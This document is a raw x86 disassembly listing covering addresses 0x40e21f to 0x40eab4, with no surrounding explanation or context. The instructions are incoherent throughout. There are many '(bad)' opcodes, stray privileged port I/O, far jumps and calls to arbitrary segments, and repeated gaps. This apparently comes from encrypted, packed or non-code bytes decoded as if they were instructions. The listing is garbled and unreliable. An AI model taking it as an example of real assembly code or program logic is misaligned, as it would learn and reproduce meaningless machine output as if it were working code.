  40e21f:	call   edi
  40e221:	pop    DWORD PTR [ebx-0x14]
  40e224:	inc    eax
  40e225:	pop    ebp
  40e226:	jae    0x40e230
  40e228:	mov    eax,0xc7ff566d
  40e22d:	jns    0x40e225
  40e22f:	add    DWORD PTR [edx-0xe],esi
  40e232:	cmp    al,0x53
  40e235:	push   es
  40e236:	push   es
  40e237:	and    DWORD PTR [ebp+0x51],0xfffffffe
  40e23b:	je     0x40e29b
  40e23d:	xchg   edx,eax
  40e23e:	mov    esi,0xfff422c9
  40e243:	mov    ds:0x40d608,al
  40e248:	aad    0x36
  40e24a:	in     al,dx
  40e24b:	push   eax
  40e24c:	cli    
  40e24d:	xchg   esp,eax
  40e24e:	std    
  40e24f:	jne    0x40e279
  40e251:	push   ebp
  40e252:	dec    eax
  40e253:	pop    ecx
  40e254:	addr16 pop ebp
  40e256:	lds    bx,DWORD PTR [edi-0x2272ffc4]
  40e25d:	push   eax
  40e25e:	dec    esi
  40e25f:	push   0x21
  40e261:	pop    esi
  40e262:	jae    0x40e270
  40e264:	daa    
  40e265:	pop    es
  40e266:	or     al,ch
	...
  40e27c:	cmp    DWORD PTR [ebx-0x68],edi
  40e27f:	(bad)  
  40e280:	neg    bh
  40e282:	lds    eax,FWORD PTR [edi]
  40e284:	cmp    DWORD PTR [ebp+ecx*4-0x60254515],eax
  40e28b:	mov    WORD PTR [ebx+ebp*4+0x32],?
  40e28f:	call   0xfee26ef4
  40e294:	into   
  40e295:	inc    ebx
  40e296:	mov    al,ds:0xaa934cfe
  40e29b:	dec    esi
  40e29c:	retfw  0xaa1
  40e2a0:	jns    0x40e2ec
  40e2a2:	adc    edi,edi
  40e2a4:	and    al,0xaf
  40e2a6:	mov    eax,ds:0xddcea574
  40e2ab:	std    
  40e2ac:	sahf   
  40e2ad:	imul   ecx,DWORD PTR ds:0xa1970cc0,0x228e8d74
  40e2b7:	push   ebp
  40e2b8:	xchg   BYTE PTR [ecx-0x68d23e35],al
  40e2be:	aaa    
  40e2bf:	mov    esp,DWORD PTR [ebp+0x71]
  40e2c2:	pop    ss
  40e2c3:	or     al,0x61
  40e2c5:	gs and al,0xff
  40e2c8:	lods   ax,WORD PTR ds:[esi]
  40e2ca:	ret    0x1a73
  40e2cd:	sub    bl,BYTE PTR [eax]
  40e2cf:	adc    cl,ch
  40e2d1:	jle    0x40e29f
  40e2d3:	pusha  
  40e2d4:	dec    esi
  40e2d5:	sbb    DWORD PTR [ebx],esi
  40e2d7:	push   0x425cb1
  40e2dc:	ds ret 
  40e2de:	cli    
  40e2df:	inc    BYTE PTR [eax]
	...
  40e2f1:	add    BYTE PTR [eax],al
  40e2f3:	add    BYTE PTR [ebp+edx*4-0x6e5b00ce],ch
  40e2fa:	stos   BYTE PTR es:[edi],al
  40e2fb:	in     eax,0xb9
  40e2fd:	fisub  WORD PTR [ecx-0x5e8b2319]
  40e303:	inc    BYTE PTR [eax]
  40e305:	in     al,dx
  40e306:	idiv   bh
  40e308:	add    BYTE PTR gs:[edx-0x51],dh
  40e30c:	sahf   
  40e30d:	add    cl,ch
  40e30f:	mov    dl,0xbc
  40e311:	sub    BYTE PTR [eax],dh
  40e313:	inc    esi
  40e314:	js     0x40e316
  40e316:	push   cs
  40e317:	sbb    BYTE PTR ds:0x6da2e32a,bh
  40e31d:	or     BYTE PTR [ecx],dl
  40e31f:	push   ebx
  40e320:	fistp  WORD PTR [edi+0x392af5]
  40e326:	(bad)  
  40e327:	pusha  
  40e328:	push   esi
  40e329:	mov    ds:0x9f394329,al
  40e32e:	push   ebx
  40e32f:	adc    BYTE PTR [ebx-0x6],dl
  40e332:	aad    0x17
  40e334:	inc    ecx
  40e335:	test   al,0x6f
  40e337:	mov    eax,ds:0x4509faf
  40e33c:	cmp    DWORD PTR [edi+0x43802c7e],ebp
  40e342:	sub    BYTE PTR [esi+edx*4],al
  40e345:	adc    eax,0x9f2d2ddd
  40e34a:	sbb    ecx,DWORD PTR [ecx+edx*4]
  40e34d:	sbb    BYTE PTR [ebp-0x16d7805f],0x3
  40e354:	pop    si
  40e356:	add    BYTE PTR [esi+0x0],ah
	...
  40e36c:	sti    
  40e36d:	inc    eax
  40e36e:	jmp    0x134cd113
  40e373:	add    BYTE PTR [esi+0x15],bl
  40e376:	loope  0x40e323
  40e378:	jecxz  0x40e318
  40e37a:	ins    DWORD PTR es:[edi],dx
  40e37b:	mov    eax,ds:0xb0e8ffd6
  40e380:	test   BYTE PTR [eax],ch
  40e382:	inc    eax
  40e383:	inc    ebp
  40e384:	clc    
  40e385:	call   DWORD PTR [ebp+0x17]
  40e388:	inc    ebp
  40e389:	sub    cl,BYTE PTR [edx]
  40e38b:	mov    eax,ds:0x385108a5
  40e390:	es lahf 
  40e392:	cmp    eax,0x392c
  40e397:	inc    esi
  40e398:	fwait
  40e399:	daa    
  40e39a:	loop   0x40e346
  40e39c:	jnp    0x40e39e
  40e39e:	call   FWORD PTR [esi+esi*1+0x261e232a]
  40e3a5:	or     al,ch
  40e3a7:	aam    0x99
  40e3a9:	popf   
  40e3aa:	(bad)  
  40e3ab:	and    bh,dh
  40e3ad:	push   es
  40e3ae:	add    BYTE PTR [ebp+esi*4-0x66da7d56],bl
  40e3b5:	sub    BYTE PTR [eax],al
  40e3b7:	sub    esp,0xffffff9d
  40e3ba:	je     0x40e39d
  40e3bc:	mov    ds:0x99e65a4c,al
  40e3c1:	xchg   DWORD PTR [ebp+ebx*8+0x12],eax
  40e3c5:	sbb    al,BYTE PTR [eax+ebp*1+0x3d]
  40e3c9:	lahf   
  40e3ca:	je     0x40e3ad
  40e3cc:	loop   0x40e419
  40e3ce:	inc    esi
	...
  40e3e4:	fstp   DWORD PTR [ebp+0x13d9bd74]
  40e3ea:	or     cl,al
  40e3ec:	xor    edi,DWORD PTR [edx]
  40e3ee:	jmp    FWORD PTR [esi-0x16fc3f7d]
  40e3f4:	dec    edi
  40e3f5:	mov    ebp,ebx
  40e3f7:	push   0x76
  40e3f9:	call   0x14fe:0xd324e969
  40e400:	cmp    eax,0x98231ca8
  40e405:	popf   
  40e406:	mov    BYTE PTR [ecx+ebx*4],ah
  40e409:	mov    DWORD PTR es:0xf4fefffa,ebp
  40e410:	inc    edx
  40e411:	test   al,0x1b
  40e413:	cwd    
  40e415:	popf   
  40e416:	(bad)  
  40e417:	aam    0x9e
  40e419:	popf   
  40e41a:	je     0x40e3fd
  40e41c:	loop   0x40e463
  40e41e:	pop    edx
  40e41f:	dec    esi
  40e420:	fxch   st(0)
  40e422:	rol    DWORD PTR [eax],0x14
  40e425:	add    dl,BYTE PTR [ebp-0x75]
  40e428:	ins    BYTE PTR es:[edi],dx
  40e429:	test   dl,al
  40e42b:	clc    
  40e42c:	cli    
  40e42d:	add    DWORD PTR [edx+0x34],ebp
  40e430:	pop    edi
  40e431:	test   BYTE PTR [edi],0xe8
  40e434:	sub    al,0xda
  40e436:	(bad)  
  40e437:	dec    DWORD PTR [ecx+0x7368fc46]
  40e43d:	inc    ebp
  40e43e:	inc    ecx
  40e43f:	add    BYTE PTR [edi],bh
  40e441:	test   BYTE PTR [edi],0xe8
  40e444:	dec    ebx
  40e445:	pop    edi
  40e446:	std    
  40e447:	inc    DWORD PTR [eax]
	...
  40e459:	add    BYTE PTR [eax],al
  40e45b:	add    dl,cl
  40e45d:	add    DWORD PTR [eax-0x4d],ebp
  40e460:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e461:	inc    edx
  40e462:	add    BYTE PTR [eax+0x7f],ch
  40e465:	inc    ebp
  40e466:	inc    ecx
  40e467:	add    bh,bl
  40e469:	mov    bh,0x73
  40e46b:	sub    DWORD PTR [ecx],edx
  40e46d:	add    al,0xe8
  40e46f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e470:	outs   dx,DWORD PTR ds:[esi]
  40e471:	jge    0x40e470
  40e473:	or     esp,eax
  40e475:	clc    
  40e476:	mov    DWORD PTR ds:[ebp+0x7c],edx
  40e47a:	data16 mov BYTE PTR [edx-0x5f97ffbc],bh
  40e481:	add    edi,ebp
  40e483:	mov    esi,0x41415af8
  40e488:	nop
  40e489:	jle    0x40e4fe
  40e48b:	clc    
  40e48c:	lahf   
  40e48d:	test   DWORD PTR [edi],0xfefcf0e8
  40e493:	(bad)  
  40e494:	cmp    BYTE PTR [eax+edi*4-0x16afc0],cl
  40e49b:	jmp    FWORD PTR [edi+0x23e2673e]
  40e4a1:	inc    ebx
  40e4a2:	add    bh,bh
  40e4a4:	inc    ebp
  40e4a5:	jns    0x40e4a4
  40e4a7:	jne    0x40e4f1
  40e4a9:	imul   esi,DWORD PTR [edi+edi*2-0x21],0x3975fd7c
  40e4b1:	das    
  40e4b2:	lods   al,BYTE PTR ds:[esi]
  40e4b3:	dec    ecx
  40e4b4:	lea    ecx,[esi-0x61]
  40e4b7:	(bad)  
  40e4b8:	lods   al,BYTE PTR ds:[esi]
  40e4b9:	inc    ebx
  40e4ba:	lahf   
  40e4bb:	je     0x40e4ee
  40e4bd:	das    
  40e4be:	popa   
  40e4bf:	pop    eax
	...
  40e4d4:	push   ss
  40e4d5:	(bad)  
  40e4d6:	int3   
  40e4d7:	shl    DWORD PTR ds:0x158b37a7,0x2a
  40e4de:	enter  0x93fb,0xa7
  40e4e2:	sub    BYTE PTR ds:0xe80a7bf6,dh
  40e4e8:	pop    eax
  40e4e9:	push   eax
  40e4ea:	popf   
  40e4eb:	(bad)  
  40e4ec:	mov    al,0x6b
  40e4ee:	sahf   
  40e4ef:	addr16 sahf 
  40e4f1:	bound  eax,QWORD PTR [ebx+0x0]
  40e4f4:	(bad)  
  40e4f5:	sbb    ecx,DWORD PTR [ebx]
  40e4f7:	call   0xfede9255
  40e4fc:	(bad)  
  40e4fd:	cmp    esp,DWORD PTR [eax-0x5570bb02]
  40e503:	mov    edx,DWORD PTR [eax]
  40e505:	mov    dh,0x9d
  40e507:	enter  0xa27b,0x2
  40e50b:	push   ebp
  40e50c:	mov    dl,0xb2
  40e50e:	add    ebx,0x6a04309d
  40e514:	dec    edi
  40e515:	push   esi
  40e516:	pop    ss
  40e517:	or     BYTE PTR [ecx-0x7900c46a],ah
  40e51d:	cmovs  edi,esp
  40e520:	adc    DWORD PTR [edi+0x46],ecx
  40e523:	inc    ecx
  40e524:	cmp    DWORD PTR [esi+0x17],esi
  40e527:	or     BYTE PTR [ecx+0x5d],ah
  40e52a:	pushf  
  40e52b:	(bad)  
  40e52c:	test   WORD PTR [edi],dx
  40e52f:	cld    
  40e530:	pop    esi
  40e531:	xchg   ebx,eax
  40e532:	or     ch,al
  40e534:	repnz out dx,eax
  40e536:	sahf   
  40e537:	inc    BYTE PTR [eax]
	...
  40e549:	add    BYTE PTR [eax],al
  40e54b:	add    BYTE PTR [eax-0x13fff998],al
  40e551:	push   DWORD PTR [ecx-0x51]
  40e554:	mov    ebx,0x39295cc3
  40e559:	es push ds
  40e55b:	lahf   
  40e55c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e55d:	or     BYTE PTR [ecx-0x62],al
  40e560:	mov    ds,WORD PTR [ebx-0x638a73bb]
  40e566:	shl    BYTE PTR [ecx-0x6116be86],1
  40e56c:	test   DWORD PTR [eax],ecx
  40e56e:	inc    ecx
  40e56f:	popf   
  40e570:	add    eax,0x859e259c
  40e575:	pushf  
  40e576:	sbb    eax,0xc2a84118
  40e57b:	cmp    al,0xee
  40e57d:	fwait
  40e57e:	pop    ds
  40e57f:	sar    DWORD PTR [edx],0x0
  40e582:	pushf  
  40e583:	mov    dl,dl
  40e585:	jg     0x40e5ab
  40e587:	lahf   
  40e588:	pusha  
  40e589:	add    BYTE PTR [ebx-0x1eea3025],al
  40e58f:	stos   DWORD PTR es:[edi],eax
  40e590:	hlt    
  40e591:	cmp    dh,ah
  40e593:	popf   
  40e594:	mov    cl,0x45
  40e596:	(bad)  [ebx+edx*4]
  40e599:	inc    esp
  40e59a:	sub    BYTE PTR [esi+ebp*4],al
  40e59d:	adc    eax,0x9d75abe1
  40e5a2:	lds    ebx,FWORD PTR [ebp-0x6242ea61]
  40e5a8:	or     eax,0xe69bc108
  40e5ad:	call   0x0:0xcbad
	...
  40e5c4:	js     0x40e5ca
  40e5c6:	jmp    0x9ded9801
  40e5cb:	pop    ss
  40e5cc:	inc    ebp
  40e5cd:	test   al,0x51
  40e5cf:	cmp    eax,0xc3e19b6e
  40e5d4:	jmp    0xe940:0xfaaf10fc
  40e5db:	xor    esp,DWORD PTR [ecx+0x30]
  40e5de:	add    BYTE PTR [esi],dl
  40e5e0:	lods   al,BYTE PTR ds:[esi]
  40e5e1:	call   0x664f:0xf02e6e4f
  40e5e8:	es or  al,ch
  40e5eb:	push   esi
  40e5ec:	out    dx,eax
  40e5ed:	cdq    
  40e5ee:	inc    BYTE PTR [ecx-0x80]
  40e5f1:	aaa    
  40e5f2:	dec    DWORD PTR [esi-0xe]
  40e5f5:	ror    BYTE PTR [ebx],0xe9
  40e5f8:	addr16 xchg ebx,ebp
  40e5fb:	push   0x1
  40e5fd:	xchg   ebx,eax
  40e5fe:	push   esi
  40e5ff:	ret    
  40e600:	cmp    ah,BYTE PTR [esi]
  40e602:	cmp    DWORD PTR [esi],ebp
  40e604:	cs or  al,ch
  40e607:	xchg   ebp,eax
  40e608:	inc    edx
  40e609:	fwait
  40e60a:	(bad)  
  40e60b:	jo     0x40e68b
  40e60d:	pushf  
  40e60e:	mov    dl,ah
  40e610:	mov    esp,0xbae940e2
  40e615:	fcos   
  40e617:	jl     0x40e657
  40e619:	sub    ah,ah
  40e61b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e61c:	jnp    0x40e61e
  40e61e:	push   edi
  40e61f:	add    DWORD PTR [esp+ebp*8-0x1],esp
  40e623:	call   0x46b4a659
	...
  40e63c:	add    al,0xa8
  40e63e:	fld    DWORD PTR [ebp-0x2c]
  40e641:	cdq    
  40e642:	or     ch,BYTE PTR [ecx+0x24893546]
  40e648:	lds    ebx,FWORD PTR [ecx-0x9af3e8c]
  40e64e:	(bad)  
  40e64f:	xor    al,0x45
  40e651:	test   al,0x85
  40e653:	mov    dh,0xad
  40e655:	cdq    
  40e656:	(bad)  
  40e657:	xor    al,0xa5
  40e659:	sub    BYTE PTR [esi+eiz*4],bl
  40e65c:	daa    
  40e65d:	or     al,ch
  40e65f:	and    ah,dl
  40e661:	cdq    
  40e662:	(bad)  
  40e663:	xchg   esi,eax
  40e664:	inc    edi
  40e665:	cwde   
  40e666:	imul   ecx,edx,0x813c5
  40e66c:	enter  0xfeea,0xff
  40e670:	xlat   BYTE PTR ds:[ebx]
  40e671:	out    0xf6,al
  40e673:	inc    esp
  40e674:	and    DWORD PTR [edi+edi*8],eax
  40e677:	jne    0x40e641
  40e679:	data16 jae 0x40e6da
  40e67c:	xlat   BYTE PTR ds:[ebx]
  40e67d:	jnp    0x40e688
  40e67f:	ror    BYTE PTR [eax+edx*4],0x4e
  40e683:	dec    DWORD PTR ds:0xdff4e76
  40e689:	push   es
  40e68a:	call   0xfdbd24fb
  40e68f:	call   0x3fbdf4
  40e694:	inc    edi
  40e695:	repnz imul eax
  40e698:	mov    bh,dl
  40e69a:	(bad)  
  40e69b:	call   DWORD PTR [eax+esi*4-0x42]
  40e69f:	mov    ecx,0x0
	...
  40e6b4:	push   edi
  40e6b5:	jl     0x40e6b4
  40e6b7:	call   DWORD PTR [edx+0x2b]
  40e6ba:	aaa    
  40e6bb:	pop    es
  40e6bc:	int    0x81
  40e6be:	std    
  40e6bf:	jne    0x40e6f5
  40e6c1:	jl     0x40e736
  40e6c3:	or     BYTE PTR [eax],ch
  40e6c5:	call   0xc2c8:0xd5c7ff56
  40e6cc:	fdiv   st(5),st
  40e6ce:	push   esp
  40e6cf:	mov    esp,esp
  40e6d1:	jne    0x40e746
  40e6d3:	or     al,0x88
  40e6d5:	push   esi
  40e6d6:	pop    esp
  40e6d7:	inc    DWORD PTR [edi-0x6a8b3ff7]
  40e6dd:	in     eax,0x5
  40e6df:	inc    ebp
  40e6e0:	push   ecx
  40e6e1:	add    al,0x50
  40e6e3:	call   0x3fbd3b
  40e6e8:	xor    BYTE PTR [ebp+0x73],dh
  40e6eb:	adc    BYTE PTR [eax],ah
  40e6ed:	jne    0x40e762
  40e6ef:	or     BYTE PTR [eax-0x28002b66],ch
  40e6f5:	ins    BYTE PTR es:[edi],dx
  40e6f6:	ins    BYTE PTR es:[edi],dx
  40e6f7:	pop    edx
  40e6f8:	cmp    DWORD PTR [edx-0x66],esi
  40e6fb:	enter  0xbb7b,0x2
  40e6ff:	push   ebp
  40e700:	mov    dl,0x73
  40e702:	xchg   bl,al
  40e704:	push   ecx
  40e705:	repnz sub eax,0x994ce300
  40e70b:	je     0x40e73e
  40e70d:	jg     0x40e699
  40e70f:	push   esi
  40e710:	and    cl,BYTE PTR ds:[ebp-0x26f1cabc]
  40e717:	lea    eax,[eax]
	...
  40e729:	add    BYTE PTR [eax],al
  40e72b:	add    BYTE PTR [ecx+0x68],ah
  40e72e:	add    al,BYTE PTR [eax+0x590ea766]
  40e734:	xchg   ecx,eax
  40e735:	test   al,0x3f
  40e737:	inc    ecx
  40e738:	cmp    DWORD PTR [edx-0x56],esi
  40e73b:	fstp   DWORD PTR [ebp-0x59]
  40e73e:	add    cl,BYTE PTR [ebx]
  40e740:	stc    
  40e741:	push   edx
  40e742:	(bad)  
  40e743:	push   esi
  40e744:	adc    esp,esp
  40e746:	es push esi
  40e749:	(bad)  
  40e74a:	ret    0x2b73
  40e74d:	and    BYTE PTR [ecx-0x8],al
  40e750:	out    0x73,al
  40e752:	call   0xe108:0x11024369
  40e759:	and    BYTE PTR [ebx+0xf91cefe],bl
  40e75f:	clc    
  40e760:	push   ebx
  40e761:	retf   
  40e762:	cdq    
  40e763:	je     0x40e796
  40e765:	scas   eax,DWORD PTR es:[edi]
  40e766:	sbb    edi,edi
  40e768:	mov    dh,0xb9
  40e76a:	cdq    
  40e76b:	je     0x40e71e
  40e76d:	cmp    al,0xe7
  40e76f:	(bad)  
  40e770:	sub    al,0x9f
  40e772:	stos   BYTE PTR es:[edi],al
  40e773:	imul   ebx,DWORD PTR [esi+0xcfe99c1],0xffffffbf
  40e77a:	stos   BYTE PTR es:[edi],al
  40e77b:	std    
  40e77c:	lock push ecx
  40e77e:	cdq    
  40e77f:	sti    
  40e780:	dec    edx
  40e781:	addr16 pop ebx
  40e783:	(bad)  
  40e784:	jle    0x40e785
  40e786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e787:	call   0x60e4:0x2e06968
  40e78e:	xchg   ebp,eax
  40e78f:	adc    BYTE PTR [eax],al
	...
  40e7a1:	add    BYTE PTR [eax],al
  40e7a3:	add    BYTE PTR [ebp-0x68],ah
  40e7a6:	adc    ecx,DWORD PTR [ecx+edx*2]
  40e7a9:	sbb    al,0x1e
  40e7ab:	fwait
  40e7ac:	push   edi
  40e7ad:	cmp    BYTE PTR [eax+0x1c003ac5],dh
  40e7b3:	(bad)  
  40e7b4:	push   edx
  40e7b5:	jl     0x40e75b
  40e7b7:	xchg   edi,eax
  40e7b8:	out    0x25,eax
  40e7ba:	jmp    0xd3d859ec
  40e7bf:	or     esp,DWORD PTR [ecx]
  40e7c1:	(bad)  
  40e7c2:	mov    ebp,0xa38a279a
  40e7c7:	xchg   edi,eax
  40e7c8:	mov    bl,0xd5
  40e7ca:	jbe    0x40e7b7
  40e7cc:	jns    0x40e7ce
  40e7ce:	imul   ebx,edx,0x2ba9140e
  40e7d4:	sub    BYTE PTR ds:0xa86603a8,bh
  40e7da:	mov    eax,0xf197f6e7
  40e7df:	ret    
  40e7e0:	push   0xffffffe3
  40e7e2:	mov    ebp,0xe236bab
  40e7e7:	call   0x2886:0xfc7cc033
  40e7ee:	jmp    0x8097c5f6
  40e7f3:	(bad)  
  40e7f4:	jge    0x40e837
  40e7f6:	jmp    0xf14ea62e
  40e7fb:	stos   DWORD PTR es:[edi],eax
  40e7fc:	sbb    DWORD PTR [esi],edx
  40e7fe:	ficomp WORD PTR [ecx-0x66d07a6a]
  40e804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e805:	xchg   esp,eax
  40e806:	sbb    esp,eax
	...
  40e81c:	loope  0x40e7b5
  40e81e:	lds    ebx,FWORD PTR [ecx-0x23716d69]
  40e824:	aaa    
  40e825:	or     eax,0xca0a900
  40e82a:	cld    
  40e82b:	scas   al,BYTE PTR es:[edi]
  40e82c:	cs or  al,ch
  40e82f:	fwait
  40e830:	sub    edx,DWORD PTR [edi-0x3e7dc102]
  40e836:	add    ebp,ecx
  40e838:	pop    ss
  40e839:	mov    ebp,ebx
  40e83b:	push   0x79
  40e83d:	lahf   
  40e83e:	add    ah,0x8d
  40e841:	in     eax,0x40
  40e843:	jmp    0xa044f582
  40e848:	jg     0x40e855
  40e84a:	add    BYTE PTR [ebx],al
  40e84c:	xor    eax,0xd1d3002a
  40e851:	xchg   ebp,eax
  40e852:	je     0x40e841
  40e854:	pop    esp
  40e855:	add    BYTE PTR [edx-0x17],ch
  40e858:	rcr    ah,cl
  40e85a:	sub    ch,cl
  40e85c:	cmp    cl,BYTE PTR [ecx+0xbb04144]
  40e862:	clc    
  40e863:	push   ecx
  40e864:	dec    ebx
  40e865:	cmp    edi,edi
  40e867:	ss mov dl,0x3b
  40e86a:	cld    
  40e86b:	cs cs cwde 
  40e86e:	(bad)  
  40e86f:	pushf  
  40e870:	into   
  40e871:	sub    bh,bh
  40e873:	push   ds
  40e874:	ds add al,0x6a
  40e877:	jmp    0xe628e890
  40e87c:	int    0x96
  40e87e:	(bad)  
  40e87f:	je     0x40e881
	...
  40e891:	add    BYTE PTR [eax],al
  40e893:	add    BYTE PTR [esi],dl
  40e895:	mov    WORD PTR [edi-0x6d],cs
  40e898:	cmp    ch,BYTE PTR [edx]
  40e89a:	add    BYTE PTR [ebx-0x11ffd734],al
  40e8a0:	das    
  40e8a1:	xchg   esp,eax
  40e8a2:	(bad)  
  40e8a3:	cld    
  40e8a4:	in     eax,dx
  40e8a5:	in     al,0x40
  40e8a7:	jmp    0x614f3fdb
  40e8ac:	mov    dl,0x96
  40e8ae:	(bad)  
  40e8af:	jmp    0x1351461
  40e8b4:	or     ecx,DWORD PTR [ebp-0x2d2fba75]
  40e8ba:	imul   eax,DWORD PTR [eax],0x688dfa
  40e8c0:	clc    
  40e8c1:	cmp    eax,DWORD PTR [ebp+0x41]
  40e8c4:	pusha  
  40e8c5:	ja     0x40e93a
  40e8c7:	hlt    
  40e8c8:	iret   
  40e8c9:	int3   
  40e8ca:	jne    0xff9fe360
  40e8d0:	inc    ebp
  40e8d1:	ins    BYTE PTR es:[edi],dx
  40e8d2:	out    0xab,al
  40e8d4:	xor    BYTE PTR [ecx-0x3],bh
  40e8d7:	mov    DWORD PTR ds:0x44c00964,edx
  40e8dd:	dec    edx
  40e8de:	push   DWORD PTR [ebp-0x48]
  40e8e1:	push   0xffffffeb
  40e8e3:	pop    eax
  40e8e4:	lahf   
  40e8e5:	js     0x40e86e
  40e8e7:	inc    ebp
  40e8e8:	jl     0x40e962
  40e8ea:	jae    0x40e8dc
  40e8ec:	js     0x40e919
  40e8ee:	push   ecx
  40e8ef:	jmp    FWORD PTR [edi+0x78]
  40e8f2:	jae    0x40e8dc
  40e8f4:	jg     0x40e8fc
  40e8f6:	in     al,dx
  40e8f7:	inc    DWORD PTR [eax]
	...
  40e909:	add    BYTE PTR [eax],al
  40e90b:	add    ch,al
  40e90d:	jno    0x40e8f5
  40e90f:	sub    al,0xa1
  40e911:	js     0x40e910
  40e913:	or     edx,DWORD PTR [eax+0x5]
  40e916:	sbb    ebp,DWORD PTR [eax-0x20]
  40e919:	add    edi,ebp
  40e91b:	mov    esi,0xe808064f
  40e920:	add    eax,0x2ffffee7
  40e925:	push   es
  40e926:	call   0xfd9e3f2a
  40e92b:	jne    0x40e8f5
  40e92d:	imul   ebx,DWORD PTR [ebx+0x55],0x75fd6dcf
  40e934:	mov    esp,0x9f58946a
  40e939:	ins    DWORD PTR es:[edi],dx
  40e93a:	std    
  40e93b:	jne    0x40e8cd
  40e93d:	fs stc 
  40e93f:	dec    edi
  40e940:	cmp    DWORD PTR [esi-0x54fb756a],ebp
  40e946:	mov    dl,BYTE PTR [ecx]
  40e948:	xchg   esi,eax
  40e949:	aam    0x8f
  40e94b:	(bad)  
  40e94c:	jmp    0x40e8dc
  40e94e:	xchg   ebp,eax
  40e94f:	je     0x40e8d6
  40e951:	mov    edi,0x667e581a
  40e956:	int3   
  40e957:	rol    DWORD PTR [ebp-0x59],0x2f
  40e95b:	mov    ebx,DWORD PTR [ebp+0x76]
  40e95e:	adc    BYTE PTR [ecx+edx*2],cl
  40e961:	xor    bh,BYTE PTR [eax]
  40e963:	call   FWORD PTR [esi-0x5e]
  40e966:	ret    0x2073
  40e969:	out    dx,eax
  40e96a:	loopne 0x40e9b0
  40e96c:	clc    
  40e96d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e96e:	xor    ch,al
	...
  40e984:	jmp    0xea3f8073
  40e989:	inc    BYTE PTR [edi+edi*4+0x79]
  40e98d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e98e:	sub    al,BYTE PTR [eax]
  40e990:	cmp    DWORD PTR [esi+0x56],eax
  40e993:	bound  esp,QWORD PTR [si+0x43]
  40e997:	add    BYTE PTR [ecx+0x21081146],cl
  40e99d:	scas   eax,DWORD PTR es:[edi]
  40e99e:	sbb    edi,edi
  40e9a0:	push   cs
  40e9a1:	das    
  40e9a2:	xlat   BYTE PTR ds:[ebx]
  40e9a3:	push   edi
  40e9a4:	push   es
  40e9a5:	into   
  40e9a6:	xchg   esi,eax
  40e9a7:	je     0x40e9d6
  40e9a9:	aas    
  40e9aa:	jle    0x40ea07
  40e9ac:	neg    ch
  40e9ae:	or     al,al
  40e9b0:	gs mov al,0x2a
  40e9b3:	sub    al,0x7c
  40e9b5:	push   0x91d15002
  40e9ba:	ss call esi
  40e9bd:	jbe    0x40e9e9
  40e9bf:	inc    ecx
  40e9c0:	mov    fs,WORD PTR [esi+0x2]
  40e9c3:	push   0xbda5a739
  40e9c8:	push   ecx
  40e9c9:	push   edx
  40e9ca:	aas    
  40e9cb:	inc    ecx
  40e9cc:	cmp    DWORD PTR [eax],eax
  40e9ce:	cmp    DWORD PTR [edi-0x2d2ef7db],edx
  40e9d4:	and    edx,DWORD PTR [ebp+0x3830abd5]
  40e9da:	into   
  40e9db:	xchg   esi,eax
  40e9dc:	add    ecx,0x88e403f0
  40e9e2:	int3   
  40e9e3:	cmp    BYTE PTR [edx-0x6d],0x42
  40e9e7:	add    al,0x0
	...
  40e9f9:	add    BYTE PTR [eax],al
  40e9fb:	add    BYTE PTR [ebx],dl
  40e9fd:	aam    0xad
  40e9ff:	adc    BYTE PTR [ecx-0x58],al
  40ea02:	aam    0x30
  40ea04:	outs   dx,BYTE PTR ds:[esi]
  40ea05:	xchg   esp,eax
  40ea06:	outs   dx,DWORD PTR ds:[esi]
  40ea07:	inc    eax
  40ea08:	gs sub ebx,esi
  40ea0b:	xchg   esi,eax
  40ea0c:	in     eax,0x7
  40ea0e:	adc    DWORD PTR [ebx],0x29859456
  40ea14:	sbb    dl,BYTE PTR [ebp+0x1d510bf3]
  40ea1a:	jbe    0x40e9b2
  40ea1c:	aas    
  40ea1d:	sub    ebp,ecx
  40ea1f:	xchg   esi,eax
  40ea20:	lods   eax,DWORD PTR ds:[esi]
  40ea21:	or     BYTE PTR [ecx+0x37],dl
  40ea24:	cs xchg esp,eax
  40ea26:	pop    ebp
  40ea27:	xchg   esi,eax
  40ea28:	lods   eax,DWORD PTR ds:[esi]
  40ea29:	xchg   esp,eax
  40ea2a:	push   ebp
  40ea2b:	adc    BYTE PTR [ecx],dh
  40ea2d:	test   al,0xa6
  40ea2f:	xor    BYTE PTR [esi],dl
  40ea31:	xchg   esp,eax
  40ea32:	das    
  40ea33:	sar    DWORD PTR [edx],0x0
  40ea36:	xchg   esp,eax
  40ea37:	mov    dl,BYTE PTR [edx]
  40ea39:	xchg   esp,eax
  40ea3a:	mov    ebx,0x8d091107
  40ea3f:	xchg   esi,eax
  40ea40:	test   DWORD PTR [edi],0x28150f29
  40ea46:	mov    ebx,0xb9007840
  40ea4b:	stos   DWORD PTR es:[edi],eax
  40ea4c:	mov    ebp,0x86960e37
  40ea51:	sub    cl,ch
  40ea53:	add    ebx,esi
  40ea55:	push   edx
  40ea56:	nop
  40ea57:	and    BYTE PTR [ecx+eax*2+0x0],bh
  40ea5b:	jmp    0xe1b57d6a
	...
  40ea74:	loop   0x40ea92
  40ea76:	jl     0x40ea5e
  40ea78:	les    ebx,FWORD PTR [ebx-0x6d33c970]
  40ea7e:	enter  0x2dab,0x0
  40ea82:	push   ebp
  40ea83:	(bad)  {k3}{z}
  40ea88:	arpl   WORD PTR [eax],ax
  40ea8a:	push   0xfffffffc
  40ea8c:	lods   eax,DWORD PTR ds:[esi]
  40ea8d:	or     al,0x8
  40ea8f:	shr    eax,0x2e
  40ea92:	jmp    FWORD PTR [esi+0x13fc3cc2]
  40ea98:	jae    0x40ea2c
  40ea9a:	je     0x40ea8d
  40ea9c:	xchg   edx,eax
  40ea9d:	imul   edi,esi,0x2329c496
  40eaa3:	mov    es,WORD PTR [esi+0x8]
  40eaa6:	call   0xfed38ef4
  40eaab:	adc    eax,DWORD PTR [ecx-0x6e]
  40eaae:	je     0x40ea91
  40eab0:	xchg   edx,eax
  40eab1:	ins    DWORD PTR es:[edi],dx
  40eab2:	(bad)  
  40eab3:	outs   dx,BYTE PTR ds:[esi]
  40eab4:	int3   
